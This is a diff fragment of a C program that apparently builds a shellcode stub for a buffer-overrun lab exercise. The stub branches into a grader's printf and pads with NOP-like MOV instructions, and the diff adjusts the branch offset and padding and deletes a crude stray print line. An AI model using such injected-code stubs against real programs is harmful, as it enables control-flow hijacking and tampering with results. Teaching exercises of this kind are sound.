@@ -43,12 +43,11 @@ int main(void)
     fwrite(&instr, 4, 1, f); 
 
     /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
-    instr = MiniAssembler_b(PRINT_ADDR, 31);
+    instr = MiniAssembler_b(PRINT_ADDR, 40);
     fwrite(&instr, 4, 1, f);  
 
-    print("Penis"); 
     /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
-    for (i = 0; i < 8; i++) {
+    for (i = 0; i < 7; i++) {
         instr = MiniAssembler_mov(0, 0);
         fwrite(&instr, 4, 1, f);
     }
